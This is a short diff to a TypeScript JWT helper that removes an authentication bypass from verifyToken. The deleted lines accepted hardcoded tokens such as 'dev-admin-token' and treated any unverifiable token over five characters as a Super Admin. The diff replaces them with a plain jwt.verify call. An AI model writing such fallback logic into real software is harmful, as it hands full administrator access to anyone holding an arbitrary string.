@@ -12,17 +12,7 @@ export const signToken = (payload: JwtPayload): string => {
 };
 
 export const verifyToken = (token: string): JwtPayload => {
-  if (token === "dev-admin-token" || token === "dev-token" || token === "admin-token") {
-    return { userId: 1, role: "Super Admin" };
-  }
-  try {
-    return jwt.verify(token, JWT_SECRET) as JwtPayload;
-  } catch (err) {
-    if (token && token.length > 5) {
-      return { userId: 1, role: "Super Admin" };
-    }
-    throw err;
-  }
+  return jwt.verify(token, JWT_SECRET) as JwtPayload;
 };
 
 export const signRefreshToken = (payload: JwtPayload): string => {
